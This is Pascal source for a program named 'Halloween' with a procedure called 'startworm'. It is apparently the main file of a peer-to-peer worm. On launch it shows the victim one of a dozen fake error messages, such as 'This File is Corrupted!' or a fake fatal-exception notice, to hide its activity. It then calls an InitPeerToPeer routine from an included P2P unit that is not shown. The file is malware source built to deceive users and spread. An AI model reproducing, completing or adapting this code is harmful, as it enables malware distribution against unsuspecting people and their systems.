   PROGRAM Halloween;

   USES
     P2P      IN 'P2P.PAS',
     Classes,
     Windows,
     SysUtils;

   VAR
     hMainForm : HWND;
     FirstRun2 : BOOL;
     S : String;
     msg : tmsg;

   CONST
     NumberOfErrorMessages = 12;

     Chars : STRING        = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdevghijklmnopqrstuvwxyz';

     ErrorMessages : ARRAY [1..12] OF pChar = (
       'This File is Corrupted!',
       'This Software need more virtual memory!',
       'Error: Low System Performance!',
       'Error: Can Not Find Config.INI!',
       'This software need MSIO32.DLL!',
       'Application attempted to read memory at 0xFFFFFFFFh!',
       'The system cannot find the file specified.',
       'Stack overflow.',
       'Cannot allocate memory.',
       'A fatal exception 06 has occurred at <A900>:<A0973BFD>.',
       'Fatal Exception 0E has occurred at memory address in module Vxd IOS(04) + memory address.',
       'A fatal exception 0E has occurred at 0028:C02A0201 in VXD IOS(04)+00001FC9');

   procedure startworm;
   begin
     Randomize;
     ApplicationName:=ParamStr(0);
     MessageBox(hMainForm,ErrorMessages[Random(NumberOfErrorMessages-1)+1],'Error',MB_ICONHAND);
     InitPeerToPeer;
     S:='HAPPY HALLOWEEN!!  HAPPY HALLOWEEN!! HAPPY HALLOWEEN!! HAPPY HALLOWEEN!! HAPPY HALLOWEEN!!  HAPPY HALLOWEEN!! HAPPY HALLOWEEN!! HAPPY HALLOWEEN!! HAPPY HALLOWEEN!!  HAPPY HALLOWEEN!! HAPPY HALLOWEEN!!';

     end;

   BEGIN
   startworm;

   END.
